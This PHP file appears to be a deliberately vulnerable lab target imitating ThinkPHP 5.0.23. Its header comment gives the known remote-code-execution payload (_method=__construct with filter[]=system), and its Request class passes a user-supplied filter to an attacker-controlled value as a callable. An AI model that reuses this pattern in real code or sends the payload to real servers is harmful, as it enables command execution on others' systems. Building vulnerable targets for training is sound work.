<?php
/**
 * ThinkPHP 5.0.23 RCE — Request::__construct() 链
 *
 * 经典 Payload:
 *   GET /?s=captcha
 *   POST: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=pwd
 */

class Handler
{
    protected $filter;
    public function display($template, $filter = null)
    {
        if ($filter && function_exists($filter)) {
            echo ($filter)($template);
        } elseif ($this->filter && is_callable($this->filter)) {
            echo ($this->filter)($template);
        } else {
            echo $template;
        }
    }
}

class App
{
    protected $request;

    public function __construct()
    {
        $this->request = new Request();
    }

    public function run()
    {
        return $this->routeCheck();
    }

    protected function routeCheck()
    {
        $method = $this->request->method();
        if (strtolower($method) === '__construct') {
            $req = new Request();
        }
        return null;
    }
}

class Request
{
    protected $filter;
    protected $server   = [];
    protected $get      = [];
    protected $post     = [];
    protected $route    = [];
    protected $param    = [];
    protected $method   = 'GET';
    protected $name     = [];
    protected $mergeParam = true;

    public function __construct()
    {
        $this->server = $_SERVER ?? [];
        $this->get    = $_GET  ?? [];
        $this->post   = $_POST ?? [];

        if (isset($_POST['_method'])) {
            $this->method = strtoupper($_POST['_method']);
        } else {
            $this->method = strtoupper($this->server['REQUEST_METHOD'] ?? 'GET');
        }

        if (isset($_POST['filter']) && is_array($_POST['filter'])) {
            $this->filter = $_POST['filter'][0] ?? null;
        }

        if (isset($_POST['server']) && is_array($_POST['server'])) {
            foreach ($_POST['server'] as $k => $v) {
                $this->server[$k] = $v;
            }
        }

        $m = $this->method();
        if ($m && $this->filter) {
            $this->input([]);
        }
    }

    public function method($method = false)
    {
        if ($method !== false) {
            $this->method = strtoupper($method);
            return $this;
        }
        if (isset($_POST['_method'])) {
            return strtoupper($_POST['_method']);
        }
        return $this->method;
    }

    public function filter($filter = null)
    {
        if ($filter !== null) {
            $this->filter = $filter;
            return $this;
        }
        return $this->filter;
    }

    public function input($data = [], $name = '', $default = null, $filter = '')
    {
        $value = null;
        if (isset($this->server['REQUEST_METHOD'])) {
            $value = $this->server['REQUEST_METHOD'];
        }
        if ($this->filter && is_callable($this->filter) && $value !== null) {
            ($this->filter)($value);
        }
        return $value;
    }

    public function param()  { return []; }
    public function route()  { return $this->route; }
    public function module() {}
    public function controller() {}
    public function action() {}
    public function __get($n) { return $this->$n ?? null; }
    public function __call($m, $a) { return null; }
}

class Controller extends Handler
{
    public $request;
    public function __construct()
    {
        $this->request = new Request();
    }
}

if (isset($_GET['s'])) {
    $app = new App();
    $app->run();
    exit;
}
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ThinkPHP</title>
    <style>
        body{font-family:"Helvetica Neue",Helvetica,Arial,Microsoft YaHei,sans-serif;background:#f5f5f5;margin:0;padding:0}
        .container{width:90%;max-width:1200px;margin:50px auto;background:#fff;border-radius:6px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:40px}
        h1{font-size:32px;color:#333;margin-bottom:20px}
        .info{margin:15px 0;color:#999;font-size:14px}
    </style>
</head>
<body>
<div class="container">
    <h1>Welcome to ThinkPHP</h1>
    <div class="info">ThinkPHP 5.0.23</div>
</div>
</body>
</html>
